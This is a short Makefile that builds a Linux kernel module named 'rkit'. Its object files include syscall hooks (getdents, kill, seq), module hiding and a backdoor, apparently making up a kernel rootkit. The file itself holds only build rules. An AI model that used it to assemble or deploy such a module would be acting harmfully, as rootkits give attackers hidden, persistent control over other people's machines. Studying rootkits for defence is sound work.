# Makefile — backend modern_5x_6x (kbuild multi-file)
#
# Bangun:   make            (di folder ini, butuh linux-headers kernel aktif)
# Lepas:    make clean
#
# Verifikasi pra-load (wajib, lihat docs/TESTING.md):
#   modinfo rkit.ko | grep vermagic   # harus cocok dengan uname -r
obj-m += rkit.o
rkit-y := core.o resolver.o hook_getdents.o hook_kill.o hook_seq.o \
           module_hide.o backdoor.o ctl_proc.o

KVER ?= $(shell uname -r)
KDIR := /lib/modules/$(KVER)/build

all:
	$(MAKE) -C $(KDIR) M=$(CURDIR) modules

clean:
	$(MAKE) -C $(KDIR) M=$(CURDIR) clean
